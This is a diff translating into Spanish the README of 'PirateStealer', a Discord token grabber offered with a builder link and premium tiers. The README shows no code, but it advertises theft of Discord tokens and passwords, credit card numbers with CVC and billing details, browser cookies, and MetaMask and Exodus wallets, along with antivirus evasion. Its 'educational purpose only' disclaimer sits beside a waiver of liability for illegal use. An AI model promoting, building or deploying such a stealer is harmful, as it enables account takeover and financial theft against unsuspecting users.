@@ -1,44 +1,44 @@
 ##### [🌍 Discord Server](Proximamente) -  [:gem: Premium](Proximamente) - [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/AlexClient/PirateStealer#features) 
 
-### Authors
+### Autores
 - Alex
 
-### Contributors
+### Colaboradores
 - Alex
 
 # PirateStealer (by AlexClient inc)
-The new modern discord token grabber & token stealer, with discord password & token even when it changes
+El nuevo capturador y ladrón de tokens de discord moderno, con contraseña y token de discord incluso cuando cambia
 
-# Terms
-- [x] Educational purpose only
-- [x] Reselling is forbidden
-- [ ] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
-- [x] We are NOT responsible of anything you do with our software (if its illegal)
+# Terminos
+- [x] Solo propósito educativo
+- [x] Prohibida la reventa
+- [ ] Puede usar el código fuente si mantiene los créditos (en incrustación + en rebajas), tiene que ser de código abierto
+- [x] NO somos responsables de nada de lo que haga con nuestro software (si es ilegal)
 
-# Features
-- QRCode logger 
+# Características
+- Registrador de códigos QR
 - Discord Login Stealer
-  - Username
+  - Nombre de usuario
   - ID
   - Token
-  - Password (even when it changes)
+  - Contraseña (incluso cuando cambia)
   - Email
   - Badges
   - Nitro
-  - Credit Card number
+  - Número de Tarjeta de Crédito
   - CVC
-  - Expiration
-  - Billing
+  - Vencimiento
+  - Facturación
 - IP
-- Computer Hostname
-- Instantly logout
-- Disable QR
-- Custom embed
-- Cool code structure
+- Nombre de host de la computadora
+- Cerrar sesión al instante
+- Deshabilitar código QR
+- Incrustacion personalizada
+- Estructura de código genial
 - Cookies (💎)
-- Password (💎)
+- Contraseña (💎)
 - Cookie Automatic Logger (💎)
 - Metamask stealer (💎)
 - Exodus stealer (💎)
-- Anti-Delete & Anti-Spam (💎)
-- 0/64 Detections (💎)
+ -Anti-Delte y Anti-Spam (💎)
+- 0/64 Detecciones (💎)
